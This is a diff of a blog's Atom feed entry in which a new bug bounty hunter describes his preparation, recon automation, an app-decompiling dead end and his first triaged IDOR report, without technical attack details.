-&lt;p&gt;Some things will not change like the need to pay your rent. So I started with saving enough money so I could dive into bounty hunting for at least half a year, without running into trouble.&lt;/p&gt;
+<h1 id="how">How</h1>
+<p>Some things will not change like the need to pay your rent. So I started with saving enough money so I could dive into bounty hunting for at least half a year, without running into trouble.</p>
 
-&lt;p&gt;First up: my so-called “attack plan”. This living document started out as an Evernote, but by now it’s a huge thing with each different attack vector (XSS, CSRF, IDOR, etc.) having it’s own space. It has guidelines on how to proceed a bug bounty program. Recon, manual attacks, references, reporting, etc.&lt;/p&gt;
+<p>First up: my so-called “attack plan”. This living document started out as an Evernote, but by now it’s a huge thing with each different attack vector (XSS, CSRF, IDOR, etc.) having it’s own space. It has guidelines on how to proceed a bug bounty program. Recon, manual attacks, references, reporting, etc.</p>
 
-&lt;p&gt;I have grown this attack plan by taking in as much knowledge as humanly possible, reading books, public disclosed reports, blogs and Bug Bounty Forum AMA’s and summarizing everything I learned into the attack plan. Head start for me was the ‘Web Hacking 101’ book by Peter Yaworski. You can have it for free when applying on HackerOne, but you should probably buy it (let alone it gives you free updates!). Also of much importance was “How to shot Web” by Jason Haddix, it helped me with a layout for recon.&lt;/p&gt;
+<p>I have grown this attack plan by taking in as much knowledge as humanly possible, reading books, public disclosed reports, blogs and Bug Bounty Forum AMA’s and summarizing everything I learned into the attack plan. Head start for me was the ‘Web Hacking 101’ book by Peter Yaworski. You can have it for free when applying on HackerOne, but you should probably buy it (let alone it gives you free updates!). Also of much importance was “How to shot Web” by Jason Haddix, it helped me with a layout for recon.</p>
 
-&lt;p&gt;Besides technical knowledge about the hacking of websites and mobile apps, there’s also a lot to learn on how to properly report issues and communicate fairly with the companies running the bounty programs. Don’t underestimate this. For instance don’t end up with ‘Not Applicables’ hurting your reputation simply because you have not properly verified the impact and reproducibility of what you report.&lt;/p&gt;
+<p>Besides technical knowledge about the hacking of websites and mobile apps, there’s also a lot to learn on how to properly report issues and communicate fairly with the companies running the bounty programs. Don’t underestimate this. For instance don’t end up with ‘Not Applicables’ hurting your reputation simply because you have not properly verified the impact and reproducibility of what you report.</p>
 
-&lt;p&gt;This is what I have done and will keep on doing: learn and process as much as possible about hacking and bug bounties. There’s nothing more fulfilling than learning.&lt;/p&gt;
+<p>This is what I have done and will keep on doing: learn and process as much as possible about hacking and bug bounties. There’s nothing more fulfilling than learning.</p>
 
-&lt;p&gt;Meanwhile I saw a chance to meet some members of the community by attending an open bar session organized by HackerOne during the HITB conference in NL. Happy to have met great people like Jobert Abma and Edwin van Andel. I remember people’s faces telling them I’m switching from software engineering to bounty hunting full-time, without having hacked anything yet! Must be crazy :-)&lt;/p&gt;
+<p>Meanwhile I saw a chance to meet some members of the community by attending an open bar session organized by HackerOne during the HITB conference in NL. Happy to have met great people like Jobert Abma and Edwin van Andel. I remember people’s faces telling them I’m switching from software engineering to bounty hunting full-time, without having hacked anything yet! Must be crazy :-)</p>
 
-&lt;p&gt;After the bigger part of a year I wrapped up my last project, had enough savings, learned a lot and was ready to go! Finally!&lt;/p&gt;
+<p>After the bigger part of a year I wrapped up my last project, had enough savings, learned a lot and was ready to go! Finally!</p>
 
-&lt;h1 id=&quot;so-far-sogood&quot;&gt;So far so good&lt;/h1&gt;
-&lt;p&gt;It’s July 2017: this is the time! What to do? Where to start? I need to organize myself. Quickly ended up with Trello to create a Bounty board with some lists like ‘to do’, ‘interesting bounty programs’, ‘research’, etc.&lt;/p&gt;
+<h1 id="so-far-sogood">So far so good</h1>
+<p>It’s July 2017: this is the time! What to do? Where to start? I need to organize myself. Quickly ended up with Trello to create a Bounty board with some lists like ‘to do’, ‘interesting bounty programs’, ‘research’, etc.</p>
 
-&lt;p&gt;Being an engineer I figured that I should automate as much as possible so I have my hands free to do actual manual hacking. So I started with creating a recon.sh file scripting away my recon process. Of course recon.sh is never finished, but by now it can process stuff like ip ranges, portscans, subdomains combined through many ways, screenshots, version control, s3 buckets, etc.&lt;/p&gt;
+<p>Being an engineer I figured that I should automate as much as possible so I have my hands free to do actual manual hacking. So I started with creating a recon.sh file scripting away my recon process. Of course recon.sh is never finished, but by now it can process stuff like ip ranges, portscans, subdomains combined through many ways, screenshots, version control, s3 buckets, etc.</p>
 
-&lt;p&gt;There are so many things you can do to get a feeling of being organized and ready. But in the end you have to just.. start.. hacking.&lt;/p&gt;
+<p>There are so many things you can do to get a feeling of being organized and ready. But in the end you have to just.. start.. hacking.</p>
 
-&lt;p&gt;I’m actually quite happy with the first month. Software engineering gives me a good feeling of having an understanding of how an application works below the hood. This allows me to look for security issues that I ‘just know’ are easy not to think about during implementation of a new feature.&lt;/p&gt;
+<p>I’m actually quite happy with the first month. Software engineering gives me a good feeling of having an understanding of how an application works below the hood. This allows me to look for security issues that I ‘just know’ are easy not to think about during implementation of a new feature.</p>
 
-&lt;p&gt;The first program I worked on I was not able to find anything. A week of trying everything I could think of. What to do now? Move on!&lt;/p&gt;
+<p>The first program I worked on I was not able to find anything. A week of trying everything I could think of. What to do now? Move on!</p>
 
-&lt;p&gt;The second program involved mobile apps. That’s cool, especially considering I joined the excellent BugCrowd LevelUp online conference having watched some nice new mobile reversing tricks. Let’s switch context and reverse those apps! After decompiling the android apk I ended up with more than 1500 java classes. Yes I went through them one by one manually, scanning for oddities. And yes of course I found something only at the very end with 30 files to go :-) An OAUTH2 client_secret. Verifying using a rooted android device with ssl unpinned and proxing traffic through burp, it became more clear: the actual OAUTH2 implementation was very limited, so it was not actually a big security risk.&lt;/p&gt;
+<p>The second program involved mobile apps. That’s cool, especially considering I joined the excellent BugCrowd LevelUp online conference having watched some nice new mobile reversing tricks. Let’s switch context and reverse those apps! After decompiling the android apk I ended up with more than 1500 java classes. Yes I went through them one by one manually, scanning for oddities. And yes of course I found something only at the very end with 30 files to go :-) An OAUTH2 client_secret. Verifying using a rooted android device with ssl unpinned and proxing traffic through burp, it became more clear: the actual OAUTH2 implementation was very limited, so it was not actually a big security risk.</p>
 
-&lt;p&gt;Moving on. Stay motivated. Working many hours a day, every day, keep seeing other people reporting many issues on many programs: I can do this too. Should I do more active scanning? I like manual testing, but.. should I?&lt;/p&gt;
+<p>Moving on. Stay motivated. Working many hours a day, every day, keep seeing other people reporting many issues on many programs: I can do this too. Should I do more active scanning? I like manual testing, but.. should I?</p>
 
-&lt;p&gt;And then I actually found something, sticking with my own way of working and mostly manually testing. Can’t get into much details about the program yet as the issue is still being resolved, but I found an IDOR with at the very least a High impact considering the business model of this company. Given a user has certain belongings, it’s possible for me to instantly take over those belongings and change them. Also this can trivially be scripted to take over thousands of objects in no time.&lt;/p&gt;
+<p>And then I actually found something, sticking with my own way of working and mostly manually testing. Can’t get into much details about the program yet as the issue is still being resolved, but I found an IDOR with at the very least a High impact considering the business model of this company. Given a user has certain belongings, it’s possible for me to instantly take over those belongings and change them. Also this can trivially be scripted to take over thousands of objects in no time.</p>
 
-&lt;p&gt;Triaged.&lt;/p&gt;
+<p>Triaged.</p>
 
-&lt;p&gt;The feelz. Went crazy. Is this real? Have to go for drinks now and chill a bit!&lt;/p&gt;
+<p>The feelz. Went crazy. Is this real? Have to go for drinks now and chill a bit!</p>
 
-&lt;h1 id=&quot;thanks&quot;&gt;Thanks&lt;/h1&gt;
-&lt;p&gt;Would like to shout out to the bug bounty community. I love how inclusive and helpful everyone is. Really gives you a feeling of being in it together.&lt;/p&gt;
+<h1 id="thanks">Thanks</h1>
+<p>Would like to shout out to the bug bounty community. I love how inclusive and helpful everyone is. Really gives you a feeling of being in it together.</p>
 
-&lt;p&gt;Special thanks to Jobert for having trust in me and helping me out, before I proved anything.&lt;/p&gt;
+<p>Special thanks to Jobert for having trust in me and helping me out, before I proved anything.</p>
 
-&lt;p&gt;Hopefully the next thing you’ll see from me is the IDOR report being publically disclosed!&lt;/p&gt;
+<p>Hopefully the next thing you’ll see from me is the IDOR report being publically disclosed!</p>
 
-&lt;p&gt;Let’s keep on hacking!&lt;/p&gt;
+<p>Let’s keep on hacking!</p>
 
-&lt;p&gt;Cheers,
-kciredor&lt;/p&gt;</content><author><name>Roderick Schaefer</name></author><summary type="html">Introduction Thank you for taking the time to read my first blog post. My name is Roderick Schaefer, known as kciredor in the exciting world of security bug bounties. I’m new and working hard to get very much involved. By sharing my journey and considerations so far, I’m hoping for more interested people to give it a shot!</summary></entry></feed>
+<p>Cheers,
+kciredor</p>]]></content><author><name>Roderick Schaefer</name></author><category term="bugbounty" /><category term="infosec" /><category term="security" /><summary type="html"><![CDATA[Introduction Thank you for taking the time to read my first blog post. My name is Roderick Schaefer, known as kciredor in the exciting world of security bug bounties. I’m new and working hard to get very much involved. By sharing my journey and considerations so far, I’m hoping for more interested people to give it a shot!]]></summary></entry></feed>
